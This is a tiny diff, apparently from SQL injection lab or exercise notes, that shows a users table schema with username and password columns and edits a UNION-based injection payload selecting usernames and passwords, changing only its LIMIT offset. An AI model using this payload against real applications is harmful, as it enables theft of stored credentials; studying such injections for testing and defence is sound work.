@@ -7,4 +7,4 @@
 
 	username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))
 
-1 UNION SELECT username, password FROM users LIMIT 1,2 -- 
+1 UNION SELECT username, password FROM users LIMIT 3,1 -- 
